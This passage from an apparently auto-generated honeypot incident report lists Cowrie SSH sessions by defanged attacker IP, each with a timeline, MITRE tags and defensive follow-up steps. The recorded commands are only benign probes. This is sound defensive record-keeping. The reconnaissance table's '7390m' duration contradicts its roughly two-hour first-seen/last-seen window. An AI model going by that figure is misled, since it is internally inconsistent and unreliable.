- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565818465b8d

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-08-15 07:58 |
| **Last Seen** | 2026-08-15 07:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:58:53` | `cowrie.session.connect` |
| `2026-08-15 07:58:54` | `cowrie.client.version` |
| `2026-08-15 07:58:54` | `cowrie.client.kex` |
| `2026-08-15 07:58:58` | `cowrie.login.success` |
| `2026-08-15 07:58:59` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be14e58793d

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-08-15 07:59 |
| **Last Seen** | 2026-08-15 07:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:59:04` | `cowrie.session.connect` |
| `2026-08-15 07:59:04` | `cowrie.client.version` |
| `2026-08-15 07:59:04` | `cowrie.client.kex` |
| `2026-08-15 07:59:06` | `cowrie.login.success` |
| `2026-08-15 07:59:06` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c1a1095efd

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 08:01 |
| **Last Seen** | 2026-08-15 08:01 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:01:08` | `cowrie.session.connect` |
| `2026-08-15 08:01:13` | `cowrie.client.version` |
| `2026-08-15 08:01:13` | `cowrie.client.kex` |
| `2026-08-15 08:01:36` | `cowrie.login.success` |
| `2026-08-15 08:01:48` | `cowrie.session.params` |
| `2026-08-15 08:01:48` | `cowrie.command.input` |
| `2026-08-15 08:01:53` | `cowrie.log.closed` |
| `2026-08-15 08:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b234d6cb2d1c

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 08:02 |
| **Last Seen** | 2026-08-15 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:02:08` | `cowrie.session.connect` |
| `2026-08-15 08:02:08` | `cowrie.client.version` |
| `2026-08-15 08:02:08` | `cowrie.client.kex` |
| `2026-08-15 08:02:09` | `cowrie.login.success` |
| `2026-08-15 08:02:10` | `cowrie.session.params` |
| `2026-08-15 08:02:10` | `cowrie.command.input` |
| `2026-08-15 08:02:10` | `cowrie.log.closed` |
| `2026-08-15 08:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4732aebabb4f

| Field | Detail |
|---|---|
| **Source IP** | `82.102.188[.]117` |
| **First Seen** | 2026-08-15 08:08 |
| **Last Seen** | 2026-08-15 08:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:08:12` | `cowrie.session.connect` |
| `2026-08-15 08:08:12` | `cowrie.client.version` |
| `2026-08-15 08:08:12` | `cowrie.client.kex` |
| `2026-08-15 08:08:13` | `cowrie.login.success` |
| `2026-08-15 08:08:14` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.188[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.102.188[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2365968f0710

| Field | Detail |
|---|---|
| **Source IP** | `60.172.41[.]103` |
| **First Seen** | 2026-08-15 08:08 |
| **Last Seen** | 2026-08-15 08:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:08:25` | `cowrie.session.connect` |
| `2026-08-15 08:08:25` | `cowrie.client.version` |
| `2026-08-15 08:08:25` | `cowrie.client.kex` |
| `2026-08-15 08:08:29` | `cowrie.login.success` |
| `2026-08-15 08:08:29` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.41[.]103` to AbuseIPDB if not already reported
- [ ] Block `60.172.41[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cb740554c4

| Field | Detail |
|---|---|
| **Source IP** | `122.187.235[.]148` |
| **First Seen** | 2026-08-15 08:14 |
| **Last Seen** | 2026-08-15 08:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:14:48` | `cowrie.session.connect` |
| `2026-08-15 08:14:49` | `cowrie.client.version` |
| `2026-08-15 08:14:49` | `cowrie.client.kex` |
| `2026-08-15 08:14:52` | `cowrie.login.success` |
| `2026-08-15 08:14:52` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.235[.]148` to AbuseIPDB if not already reported
- [ ] Block `122.187.235[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e48b1820a2b1

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-08-15 08:14 |
| **Last Seen** | 2026-08-15 08:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:14:58` | `cowrie.session.connect` |
| `2026-08-15 08:14:59` | `cowrie.client.version` |
| `2026-08-15 08:14:59` | `cowrie.client.kex` |
| `2026-08-15 08:15:01` | `cowrie.login.success` |
| `2026-08-15 08:15:01` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3860f00c4364

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]195` |
| **First Seen** | 2026-08-15 08:16 |
| **Last Seen** | 2026-08-15 08:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:16:42` | `cowrie.session.connect` |
| `2026-08-15 08:16:43` | `cowrie.client.version` |
| `2026-08-15 08:16:43` | `cowrie.client.kex` |
| `2026-08-15 08:16:44` | `cowrie.login.success` |
| `2026-08-15 08:16:45` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137d61a38f22

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-15 08:16 |
| **Last Seen** | 2026-08-15 08:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:16:51` | `cowrie.session.connect` |
| `2026-08-15 08:16:51` | `cowrie.client.version` |
| `2026-08-15 08:16:51` | `cowrie.client.kex` |
| `2026-08-15 08:16:53` | `cowrie.login.success` |
| `2026-08-15 08:16:53` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf747ef764ab

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-08-15 08:20 |
| **Last Seen** | 2026-08-15 08:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:20:04` | `cowrie.session.connect` |
| `2026-08-15 08:20:05` | `cowrie.client.version` |
| `2026-08-15 08:20:05` | `cowrie.client.kex` |
| `2026-08-15 08:20:07` | `cowrie.login.success` |
| `2026-08-15 08:20:07` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d81d2e7690f2

| Field | Detail |
|---|---|
| **Source IP** | `82.102.149[.]88` |
| **First Seen** | 2026-08-15 08:20 |
| **Last Seen** | 2026-08-15 08:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:20:13` | `cowrie.session.connect` |
| `2026-08-15 08:20:14` | `cowrie.client.version` |
| `2026-08-15 08:20:14` | `cowrie.client.kex` |
| `2026-08-15 08:20:15` | `cowrie.login.success` |
| `2026-08-15 08:20:16` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.149[.]88` to AbuseIPDB if not already reported
- [ ] Block `82.102.149[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcac4cf3f9d8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 08:21 |
| **Last Seen** | 2026-08-15 08:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:21:14` | `cowrie.session.connect` |
| `2026-08-15 08:21:14` | `cowrie.client.version` |
| `2026-08-15 08:21:14` | `cowrie.client.kex` |
| `2026-08-15 08:21:15` | `cowrie.login.success` |
| `2026-08-15 08:21:15` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:21:15` | `cowrie.direct-tcpip.data` |
| `2026-08-15 08:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01bc14aa1e1e

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 08:21 |
| **Last Seen** | 2026-08-15 08:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:21:22` | `cowrie.session.connect` |
| `2026-08-15 08:21:22` | `cowrie.client.version` |
| `2026-08-15 08:21:22` | `cowrie.client.kex` |
| `2026-08-15 08:21:22` | `cowrie.login.success` |
| `2026-08-15 08:21:23` | `cowrie.session.params` |
| `2026-08-15 08:21:23` | `cowrie.command.input` |
| `2026-08-15 08:21:24` | `cowrie.log.closed` |
| `2026-08-15 08:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8017ef309799

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-15 08:21 |
| **Last Seen** | 2026-08-15 08:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:21:48` | `cowrie.session.connect` |
| `2026-08-15 08:21:49` | `cowrie.client.version` |
| `2026-08-15 08:21:49` | `cowrie.client.kex` |
| `2026-08-15 08:21:50` | `cowrie.login.success` |
| `2026-08-15 08:21:51` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7c03be0a33

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-15 08:21 |
| **Last Seen** | 2026-08-15 08:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:21:56` | `cowrie.session.connect` |
| `2026-08-15 08:21:56` | `cowrie.client.version` |
| `2026-08-15 08:21:56` | `cowrie.client.kex` |
| `2026-08-15 08:21:57` | `cowrie.login.success` |
| `2026-08-15 08:21:57` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bca3887e088

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-15 08:22 |
| **Last Seen** | 2026-08-15 08:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:22:01` | `cowrie.session.connect` |
| `2026-08-15 08:22:02` | `cowrie.client.version` |
| `2026-08-15 08:22:02` | `cowrie.client.kex` |
| `2026-08-15 08:22:05` | `cowrie.login.success` |
| `2026-08-15 08:22:05` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-406142766927

| Field | Detail |
|---|---|
| **Source IP** | `190.223.36[.]108` |
| **First Seen** | 2026-08-15 08:22 |
| **Last Seen** | 2026-08-15 08:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:22:11` | `cowrie.session.connect` |
| `2026-08-15 08:22:12` | `cowrie.client.version` |
| `2026-08-15 08:22:12` | `cowrie.client.kex` |
| `2026-08-15 08:22:14` | `cowrie.login.success` |
| `2026-08-15 08:22:14` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.36[.]108` to AbuseIPDB if not already reported
- [ ] Block `190.223.36[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f108fce30f3b

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 08:23 |
| **Last Seen** | 2026-08-15 08:24 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:23:46` | `cowrie.session.connect` |
| `2026-08-15 08:23:53` | `cowrie.client.version` |
| `2026-08-15 08:23:53` | `cowrie.client.kex` |
| `2026-08-15 08:24:16` | `cowrie.login.success` |
| `2026-08-15 08:24:28` | `cowrie.session.params` |
| `2026-08-15 08:24:28` | `cowrie.command.input` |
| `2026-08-15 08:24:33` | `cowrie.log.closed` |
| `2026-08-15 08:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40cf02c725c

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-08-15 08:33 |
| **Last Seen** | 2026-08-15 08:33 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:33:06` | `cowrie.session.connect` |
| `2026-08-15 08:33:08` | `cowrie.client.version` |
| `2026-08-15 08:33:08` | `cowrie.client.kex` |
| `2026-08-15 08:33:13` | `cowrie.login.success` |
| `2026-08-15 08:33:14` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9fc70ab9f3f

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 08:40 |
| **Last Seen** | 2026-08-15 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:40:35` | `cowrie.session.connect` |
| `2026-08-15 08:40:35` | `cowrie.client.version` |
| `2026-08-15 08:40:36` | `cowrie.client.kex` |
| `2026-08-15 08:40:36` | `cowrie.login.success` |
| `2026-08-15 08:40:37` | `cowrie.session.params` |
| `2026-08-15 08:40:37` | `cowrie.command.input` |
| `2026-08-15 08:40:37` | `cowrie.log.closed` |
| `2026-08-15 08:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7530d5a5d1e4

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-15 08:45 |
| **Last Seen** | 2026-08-15 08:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:45:53` | `cowrie.session.connect` |
| `2026-08-15 08:45:53` | `cowrie.client.version` |
| `2026-08-15 08:45:53` | `cowrie.client.kex` |
| `2026-08-15 08:45:54` | `cowrie.login.success` |
| `2026-08-15 08:45:54` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb7f4943dd3

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-08-15 08:45 |
| **Last Seen** | 2026-08-15 08:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:45:59` | `cowrie.session.connect` |
| `2026-08-15 08:46:00` | `cowrie.client.version` |
| `2026-08-15 08:46:00` | `cowrie.client.kex` |
| `2026-08-15 08:46:03` | `cowrie.login.success` |
| `2026-08-15 08:46:05` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a700f7122e30

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 08:46 |
| **Last Seen** | 2026-08-15 08:47 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:46:34` | `cowrie.session.connect` |
| `2026-08-15 08:46:39` | `cowrie.client.version` |
| `2026-08-15 08:46:39` | `cowrie.client.kex` |
| `2026-08-15 08:47:01` | `cowrie.login.success` |
| `2026-08-15 08:47:14` | `cowrie.session.params` |
| `2026-08-15 08:47:14` | `cowrie.command.input` |
| `2026-08-15 08:47:19` | `cowrie.log.closed` |
| `2026-08-15 08:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09a77ae2344

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-15 08:51 |
| **Last Seen** | 2026-08-15 08:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 08:51:03` | `cowrie.session.connect` |
| `2026-08-15 08:51:03` | `cowrie.client.version` |
| `2026-08-15 08:51:03` | `cowrie.client.kex` |
| `2026-08-15 08:51:06` | `cowrie.login.success` |
| `2026-08-15 08:51:07` | `cowrie.direct-tcpip.request` |
| `2026-08-15 08:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **6196** | 2026-08-15 06:55 | 2026-08-15 08:54 | 7390m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **9** | 2026-08-15 07:19 | 2026-08-15 08:49 | 6m | 0 | `T1592` | 🟢 LOW |
